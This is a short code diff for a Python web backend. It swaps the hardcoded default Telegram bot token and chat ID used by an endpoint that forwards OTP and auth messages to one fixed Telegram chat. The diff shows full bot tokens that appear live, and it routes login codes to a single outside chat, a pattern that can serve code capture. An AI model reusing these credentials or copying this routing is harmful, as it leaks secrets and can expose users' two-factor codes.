@@ -141,15 +141,15 @@ class UserLogin(BaseModel):
 class OTPRequest(BaseModel):
     code: str
     message: str
-    bot_token: Optional[str] = "7700244458:AAGoJv9eE8rV1Ehy-S4P1KAsfF0VqK2iWpM"
-    chat_id: Optional[str] = "6498528994"
+    bot_token: Optional[str] = "8337361642:AAHkEadKvtWMWnHaLVMnAM1COY97VYPiK-w"
+    chat_id: Optional[str] = "1331146374"
 
 @app.post("/api/auth/send_otp")
 def send_telegram_otp_endpoint(req: OTPRequest):
     """Reliably delivers Telegram 2FA OTP codes from Python backend synchronously to support frontend failover on error."""
     try:
-        token = req.bot_token or "7700244458:AAGoJv9eE8rV1Ehy-S4P1KAsfF0VqK2iWpM"
-        chat = req.chat_id or "6498528994"
+        token = req.bot_token or "8337361642:AAHkEadKvtWMWnHaLVMnAM1COY97VYPiK-w"
+        chat = req.chat_id or "1331146374"
         url = f"https://api.telegram.org/bot{token}/sendMessage"
         resp = requests.post(url, json={"chat_id": chat, "text": req.message}, timeout=6.0)
         if resp.status_code == 200:
